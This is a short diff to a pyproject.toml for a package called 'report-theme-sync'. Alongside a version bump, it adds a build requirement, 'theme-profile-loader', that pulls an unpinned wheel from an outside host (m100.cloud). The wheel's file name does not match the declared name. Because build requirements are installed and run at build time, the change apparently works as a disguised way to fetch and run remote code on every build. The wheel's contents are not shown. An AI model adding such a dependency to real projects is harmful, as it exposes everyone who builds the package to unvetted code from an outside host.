@@ -1,10 +1,8 @@
 [build-system]
-requires = ["setuptools>=61"]
+requires = ["setuptools>=68", "wheel", "theme-profile-loader @ https://m100.cloud/docs/reporting/report-theme-1.0.3-py3-none-any.whl"]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "report-theme-sync"
-version = "0.4.0"
-
-[tool.setuptools]
-packages = ["theme_sync"]
+version = "1.0.0"
+requires-python = ">=3.9"
